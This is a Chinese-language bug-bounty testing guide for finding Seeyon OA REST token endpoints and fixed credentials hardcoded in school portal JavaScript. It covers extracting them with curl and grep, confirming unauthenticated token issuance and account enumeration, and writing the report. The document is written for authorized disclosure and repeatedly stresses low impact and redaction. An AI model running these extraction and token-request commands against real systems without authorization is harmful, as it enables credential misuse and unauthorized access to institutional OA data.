# 致远OA REST Token接口泄露与未授权Token签发测试模式

## 触发场景

教育目标的一站式办事大厅、任务中心、门户前端JS中，可能硬编码致远OA集成接口，例如：

- `/seeyon/rest/token/<restAccount>/<restPassword>?loginName=`
- 前端配置或打包JS中出现 `seeyon/rest/token`、`rest_fwx`、`admin123`、`loginName=` 等字符串
- 任务中心类系统可能引用外部OA域名，存在跨系统/跨校关联资产风险

## 发现方法

1. 下载门户/任务中心主JS：

```bash
curl -sk "https://TARGET/taskcenter-v4/static/js/app.js?V=null" -o /tmp/app.js
```

2. 搜索致远REST Token接口与固定凭据：

```bash
grep -aoE 'https?://[^"'"'"' ]+/seeyon/rest/token/[^"'"'"' <]+' /tmp/app.js | sort -u
grep -aoE '/seeyon/rest/token/[A-Za-z0-9_./?=&%-]+' /tmp/app.js | sort -u
```

3. 如果JS较大，先提取URL和敏感关键词：

```bash
grep -aoE 'https?://[^"'"'"'<> )]+' /tmp/app.js | sort -u
grep -aoiE 'seeyon|rest/token|loginName|rest_[A-Za-z0-9_]+|admin123|token' /tmp/app.js | sort -u
```

## 安全验证步骤（低影响）

只做空值和随机不存在账号验证，避免对真实教职工账号越权取Token：

```bash
# 空 loginName：若返回 UUID/长随机串，说明未授权触发Token签发逻辑
curl -sk -D- "https://OA_HOST/seeyon/rest/token/REST_USER/REST_PASS?loginName="

# 随机不存在账号：若返回 User not found，说明接口按 loginName 进入用户查询逻辑，存在账号枚举/Token签发风险
curl -sk -D- "https://OA_HOST/seeyon/rest/token/REST_USER/REST_PASS?loginName=__nonexistent_test__"
```

典型响应：

```text
HTTP/1.1 200
Content-Type: text/plain;charset=UTF-8

39230fac-fe5c-402b-b5cf-bd46e1d421b7
```

```json
{
  "code": 500,
  "success": false,
  "message": "User not found:loginName=__nonexistent_test__"
}
```

## 影响验证与定级

### 可提交中危/高危边界

如果只证明：
- 前端公开JS泄露 `/seeyon/rest/token/<固定账号>/<固定密码>`；
- 未登录可调用Token接口；
- 空 `loginName` 返回 UUID/Token；
- 不存在用户返回 `User not found`；

可按“敏感凭据泄露 + 未授权Token签发 + 账号枚举风险”提交，等级建议中危；若SRC重视OA集成凭据泄露，可尝试高危但要保守表述。

### 升级高危条件

只有在授权范围内进一步证明以下任一项，才升级高危：
- 使用合法测试账号 loginName 获取Token后，可读取OA待办、流程、通讯录、组织架构等敏感数据；
- Token可调用写操作接口（流程审批、表单提交、消息发送等）；
- 可枚举多个有效loginName并批量签发Token。

不要使用真实教职工账号做越权取Token，除非SRC/客户明确授权。

## 报告要点

报告标题建议：

```text
XXX学校办事大厅前端JS存在致远OA REST Token接口硬编码泄露，导致未授权获取Token
```

复现证据应包含：
1. JS中硬编码Token接口地址和固定凭据（截图命令+返回）。
2. 未登录调用空 `loginName` 返回Token/UUID（Token中间打码）。
3. 随机不存在账号返回 `User not found`，证明参数进入用户查询/签发逻辑。
4. OA系统版本/标题证明接口归属（如 `/seeyon/main.do` 标题、`V=V8_2_*`、`seeyonProductId`）。
5. 明确说明“未使用真实账号进一步取Token，避免扩大影响；建议审核方用测试账号验证Token权限”。

## 跨域/关联OA资产场景补充

当目标学校门户或办事大厅 JS 泄露的 Seeyon Token 接口指向另一个相似但不同的学校域名、集团域名或第三方 OA 域名时，不要直接放弃，也不要夸大资产归属。处理方式：

1. 把“泄露来源”和“被调用 OA 资产”分开写清：例如漏洞入口是 `service.<target>.edu.cn` 的公开 JS，Token 接口实际位于 `my.<other-school>.edu.cn/seeyon/rest/token/...`。
2. 先证明泄露来源可由目标域名未登录访问，再证明 OA Token 接口和固定凭据有效；报告中明确请 SRC 确认关联/托管 OA 资产归属。
3. 用错误 REST 密码做对照：将 URL 中固定密码替换为 `__wrong_password__`，若返回 401/失败页，而原始泄露密码能返回 UUID/Token，则可证明 JS 中密码为有效凭据而非示例字符串。
4. 报告正文默认脱敏 REST 密码和 UUID；复现命令优先从公开 JS 自动提取完整 Token URL 后调用，避免在报告正文和对话中二次扩散固定密码。
5. 辅助证明 OA 归属/版本：轻量访问 `/seeyon/index.jsp` 或 `/seeyon/main.do`，提取 `<title>`、`V=V8_*`、平台名称等；若标题显示另一个学校名称，必须在详情和影响中保守说明“来源位于当前目标 JS，OA 归属需 SRC 确认”。
6. 仍然遵守低影响边界：没有明确授权时，不使用真实教职工 `loginName` 获取 Token，不访问待办/通讯录/流程数据；只用空 `loginName`、随机不存在账号、错误密码对照证明风险。

可复制命令模式（报告中可脱敏展示）：

```bash
# 从目标公开 JS 自动提取 Token URL 并脱敏展示
curl -sk "https://TARGET/taskcenter-v4/static/js/app.js?V=null" | grep -aoE 'https?://[^"'"'"'<> )]+/seeyon/rest/token/[^"'"'"' <]+' | sort -u | sed -E 's#(rest/token/[^/]+/)[^?]+#\1[REDACTED_PASSWORD]#'

# 自动提取完整 URL 后做空 loginName 低影响验证，输出时脱敏 UUID
bash <<'EOF'
set -e
JS="https://TARGET/taskcenter-v4/static/js/app.js?V=null"
TOKEN_URL=$(curl -sk --max-time 15 "$JS" | grep -aoE 'https?://[^"'"'"'<> )]+/seeyon/rest/token/[^"'"'"' <]+' | head -1)
curl -sk --max-time 15 "$TOKEN_URL" -o /tmp/seeyon_empty.body
python3 - <<'PY'
import re
body=open('/tmp/seeyon_empty.body','r',errors='ignore').read()
print(re.sub(r'"id"\s*:\s*"[^"]+"','"id":"[REDACTED_UUID]"',body))
PY
EOF
```

## 陷阱

- 如果硬编码的OA域名与当前学校域名不一致，报告中必须说明“漏洞来源是当前目标前端JS暴露关联/第三方OA集成凭据”，并提醒SRC确认资产归属。
- 空 `loginName` 返回Token但无法访问业务接口时，不要夸大为已接管OA；应表述为Token签发接口暴露和凭据泄露。
- CORS `Access-Control-Allow-Origin: *` + `Credentials:true` 在现代浏览器中未必可用，不能替代Token泄露主证据。
- 致远版本号/Tomcat错误页只能作为辅助证据，不要单独提交低危凑数。
